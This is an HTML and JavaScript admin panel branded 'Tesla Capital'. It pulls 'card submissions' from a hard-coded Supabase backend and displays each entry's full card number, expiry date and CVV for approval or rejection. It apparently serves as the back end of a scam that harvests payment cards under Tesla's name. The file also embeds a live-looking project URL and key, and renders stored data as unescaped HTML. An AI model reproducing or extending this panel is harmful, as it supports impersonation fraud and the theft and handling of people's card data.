<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tesla Capital - Admin Cards</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        body { background-color: #0d0d0d; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        ::-webkit-scrollbar { width: 6px; }
        ::-webkit-scrollbar-track { background: #121212; }
        ::-webkit-scrollbar-thumb { background: #333; border-radius: 99px; }
    </style>
</head>
<body class="text-white min-h-screen">

    <!-- Header -->
    <header class="flex items-center justify-between px-6 py-4 border-b border-[#1c1c1c] bg-[#0d0d0d] sticky top-0 z-50">
        <div class="flex items-center space-x-3">
            <span class="text-xl font-bold tracking-widest text-[#E82127]">TESLA</span>
            <span class="text-xs text-neutral-500 font-medium">ADMIN // CARD SUBMISSIONS</span>
        </div>
        <div class="flex items-center space-x-4">
            <a href="admin-messages.html" class="text-xs text-neutral-400 hover:text-white transition-colors">Messages</a>
            <a href="dashboard.html" class="text-xs text-neutral-400 hover:text-white transition-colors">Dashboard</a>
            <button onclick="location.reload()" class="text-xs bg-neutral-800 hover:bg-neutral-700 px-3 py-1.5 rounded-lg transition-colors">
                Refresh
            </button>
        </div>
    </header>

    <main class="max-w-6xl mx-auto px-4 py-8">

        <!-- Stats -->
        <div class="grid grid-cols-2 md:grid-cols-4 gap-4 mb-8">
            <div class="bg-[#141414] border border-[#222] rounded-2xl p-4">
                <p class="text-[10px] uppercase tracking-wider text-neutral-500 font-bold">Total Submissions</p>
                <p id="statTotal" class="text-2xl font-bold mt-1">—</p>
            </div>
            <div class="bg-[#141414] border border-[#222] rounded-2xl p-4">
                <p class="text-[10px] uppercase tracking-wider text-neutral-500 font-bold">Pending</p>
                <p id="statPending" class="text-2xl font-bold mt-1 text-amber-400">—</p>
            </div>
            <div class="bg-[#141414] border border-[#222] rounded-2xl p-4">
                <p class="text-[10px] uppercase tracking-wider text-neutral-500 font-bold">Approved</p>
                <p id="statApproved" class="text-2xl font-bold mt-1 text-emerald-400">—</p>
            </div>
            <div class="bg-[#141414] border border-[#222] rounded-2xl p-4">
                <p class="text-[10px] uppercase tracking-wider text-neutral-500 font-bold">Rejected</p>
                <p id="statRejected" class="text-2xl font-bold mt-1 text-red-400">—</p>
            </div>
        </div>

        <!-- Filter -->
        <div class="flex items-center justify-between mb-6">
            <h2 class="text-lg font-bold">Card Submissions</h2>
            <select id="statusFilter" onchange="loadCards()" class="bg-[#1c1c1c] border border-[#333] rounded-xl px-4 py-2 text-sm focus:outline-none focus:border-[#E82127]">
                <option value="all">All Status</option>
                <option value="Pending">Pending</option>
                <option value="Approved">Approved</option>
                <option value="Rejected">Rejected</option>
            </select>
        </div>

        <!-- Cards List -->
        <div id="cardsContainer" class="space-y-4">
            <div class="text-center py-20 text-neutral-500">
                <div class="w-8 h-8 border-2 border-neutral-700 border-t-[#E82127] rounded-full animate-spin mx-auto mb-4"></div>
                Loading card submissions...
            </div>
        </div>
    </main>

    <!-- Detail Modal -->
    <div id="detailModal" class="hidden fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center p-4">
        <div class="bg-[#141414] border border-[#222] rounded-2xl w-full max-w-lg max-h-[90vh] overflow-y-auto">
            <div class="sticky top-0 bg-[#141414] border-b border-[#222] px-6 py-4 flex items-center justify-between">
                <h3 class="font-bold">Card Details</h3>
                <button onclick="closeModal()" class="text-neutral-400 hover:text-white text-xl">×</button>
            </div>
            <div id="modalContent" class="p-6 space-y-4">
                <!-- filled by JS -->
            </div>
        </div>
    </div>

    <script>
        // ========== SUPABASE CONNECTION ==========
        const SUPABASE_URL = "https://jawpzkqvcvcrmpirqcma.supabase.co";
        const SUPABASE_ANON_KEY = "sb_publishable_EAds5LMLdll_0ubbbhw_kg_fJxzlOtH";
        const { createClient } = supabase;
        const _supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
        // =========================================

        let allCards = [];

        async function loadCards() {
            const container = document.getElementById('cardsContainer');
            const filter = document.getElementById('statusFilter').value;

            try {
                let query = _supabase
                    .from('card_submissions')
                    .select('*')
                    .order('created_at', { ascending: false });

                if (filter !== 'all') {
                    query = query.eq('status', filter);
                }

                const { data, error } = await query;

                if (error) throw error;

                allCards = data || [];
                updateStats(allCards);
                renderCards(allCards);

            } catch (err) {
                console.error(err);
                container.innerHTML = `
                    <div class="text-center py-16 text-red-400">
                        Failed to load cards. Check console for details.
                    </div>`;
            }
        }

        function updateStats(cards) {
            document.getElementById('statTotal').innerText = cards.length;
            document.getElementById('statPending').innerText = cards.filter(c => c.status === 'Pending').length;
            document.getElementById('statApproved').innerText = cards.filter(c => c.status === 'Approved').length;
            document.getElementById('statRejected').innerText = cards.filter(c => c.status === 'Rejected').length;
        }

        function renderCards(cards) {
            const container = document.getElementById('cardsContainer');

            if (!cards || cards.length === 0) {
                container.innerHTML = `
                    <div class="text-center py-20 text-neutral-500">
                        <p class="text-4xl mb-3">💳</p>
                        <p>No card submissions found</p>
                    </div>`;
                return;
            }

            container.innerHTML = cards.map(card => {
                const date = card.created_at 
                    ? new Date(card.created_at).toLocaleString('en-US', {
                        year: 'numeric', month: 'short', day: 'numeric',
                        hour: '2-digit', minute: '2-digit'
                    })
                    : '—';

                const statusColor = {
                    'Pending': 'bg-amber-500/15 text-amber-400 border-amber-500/30',
                    'Approved': 'bg-emerald-500/15 text-emerald-400 border-emerald-500/30',
                    'Rejected': 'bg-red-500/15 text-red-400 border-red-500/30'
                }[card.status] || 'bg-neutral-500/15 text-neutral-400 border-neutral-500/30';

                return `
                <div class="bg-[#141414] border border-[#222] rounded-2xl p-5 hover:border-neutral-700 transition-all">
                    <div class="flex flex-col md:flex-row md:items-center justify-between gap-4">
                        <div class="flex-1 space-y-1">
                            <div class="flex items-center space-x-3">
                                <span class="text-sm font-bold text-white">${card.card_type || 'Unknown Card'}</span>
                                <span class="text-[10px] px-2 py-0.5 rounded-full border font-bold uppercase tracking-wider ${statusColor}">
                                    ${card.status || 'Pending'}
                                </span>
                            </div>
                            <p class="text-xs text-neutral-400 font-mono">ID: ${card.id}</p>
                            <p class="text-xs text-neutral-500">User: <span class="text-neutral-300 font-mono">${card.user_id}</span></p>
                            <p class="text-xs text-neutral-500">Submitted: ${date}</p>
                        </div>

                        <div class="flex items-center space-x-2">
                            <button onclick="viewCard('${card.id}')" 
                                class="px-4 py-2 bg-neutral-800 hover:bg-neutral-700 rounded-xl text-xs font-medium transition-colors">
                                View Details
                            </button>
                            ${card.status === 'Pending' ? `
                                <button onclick="updateStatus('${card.id}', 'Approved')" 
                                    class="px-4 py-2 bg-emerald-600/20 hover:bg-emerald-600/40 text-emerald-400 border border-emerald-600/30 rounded-xl text-xs font-medium transition-colors">
                                    Approve
                                </button>
                                <button onclick="updateStatus('${card.id}', 'Rejected')" 
                                    class="px-4 py-2 bg-red-600/20 hover:bg-red-600/40 text-red-400 border border-red-600/30 rounded-xl text-xs font-medium transition-colors">
                                    Reject
                                </button>
                            ` : ''}
                        </div>
                    </div>
                </div>`;
            }).join('');
        }

        function viewCard(id) {
            const card = allCards.find(c => c.id === id);
            if (!card) return;

            const date = card.created_at 
                ? new Date(card.created_at).toLocaleString()
                : '—';

            document.getElementById('modalContent').innerHTML = `
                <div class="space-y-4">
                    <div class="bg-[#0d0d0d] border border-[#222] rounded-xl p-4 space-y-3">
                        <div class="flex justify-between">
                            <span class="text-xs text-neutral-500 uppercase tracking-wider">Submission ID</span>
                            <span class="text-sm font-mono text-neutral-200">${card.id}</span>
                        </div>
                        <div class="flex justify-between">
                            <span class="text-xs text-neutral-500 uppercase tracking-wider">User ID</span>
                            <span class="text-sm font-mono text-neutral-200">${card.user_id}</span>
                        </div>
                        <div class="flex justify-between">
                            <span class="text-xs text-neutral-500 uppercase tracking-wider">Status</span>
                            <span class="text-sm font-bold ${card.status === 'Pending' ? 'text-amber-400' : card.status === 'Approved' ? 'text-emerald-400' : 'text-red-400'}">${card.status}</span>
                        </div>
                        <div class="flex justify-between">
                            <span class="text-xs text-neutral-500 uppercase tracking-wider">Submitted At</span>
                            <span class="text-sm text-neutral-200">${date}</span>
                        </div>
                    </div>

                    <div class="bg-[#0d0d0d] border border-[#222] rounded-xl p-4 space-y-3">
                        <h4 class="text-xs font-bold uppercase tracking-wider text-neutral-400 mb-2">Card Information</h4>
                        
                        <div>
                            <p class="text-[10px] text-neutral-500 uppercase tracking-wider mb-1">Card Type / Brand</p>
                            <p class="text-sm font-medium text-white">${card.card_type || '—'}</p>
                        </div>
                        <div>
                            <p class="text-[10px] text-neutral-500 uppercase tracking-wider mb-1">Card Number</p>
                            <p class="text-sm font-mono text-white break-all select-all">${card.card_number || '—'}</p>
                        </div>
                        <div class="grid grid-cols-2 gap-4">
                            <div>
                                <p class="text-[10px] text-neutral-500 uppercase tracking-wider mb-1">Expiry</p>
                                <p class="text-sm font-mono text-white">${card.expiry || '—'}</p>
                            </div>
                            <div>
                                <p class="text-[10px] text-neutral-500 uppercase tracking-wider mb-1">CVV</p>
                                <p class="text-sm font-mono text-white">${card.cvv || '—'}</p>
                            </div>
                        </div>
                    </div>

                    <div class="flex space-x-3 pt-2">
                        ${card.status === 'Pending' ? `
                            <button onclick="updateStatus('${card.id}', 'Approved'); closeModal();" 
                                class="flex-1 bg-emerald-600 hover:bg-emerald-500 py-3 rounded-xl text-sm font-medium transition-colors">
                                Approve Card
                            </button>
                            <button onclick="updateStatus('${card.id}', 'Rejected'); closeModal();" 
                                class="flex-1 bg-red-600 hover:bg-red-500 py-3 rounded-xl text-sm font-medium transition-colors">
                                Reject Card
                            </button>
                        ` : `
                            <button onclick="closeModal()" class="flex-1 bg-neutral-800 hover:bg-neutral-700 py-3 rounded-xl text-sm font-medium transition-colors">
                                Close
                            </button>
                        `}
                    </div>
                </div>
            `;

            document.getElementById('detailModal').classList.remove('hidden');
        }

        function closeModal() {
            document.getElementById('detailModal').classList.add('hidden');
        }

        async function updateStatus(id, newStatus) {
            try {
                const { error } = await _supabase
                    .from('card_submissions')
                    .update({ status: newStatus })
                    .eq('id', id);

                if (error) throw error;

                // Refresh list
                await loadCards();
            } catch (err) {
                console.error(err);
                alert('Failed to update status: ' + err.message);
            }
        }

        // Close modal on outside click
        document.getElementById('detailModal').addEventListener('click', (e) => {
            if (e.target.id === 'detailModal') closeModal();
        });

        // Initial load
        loadCards();
    </script>
</body>
</html>
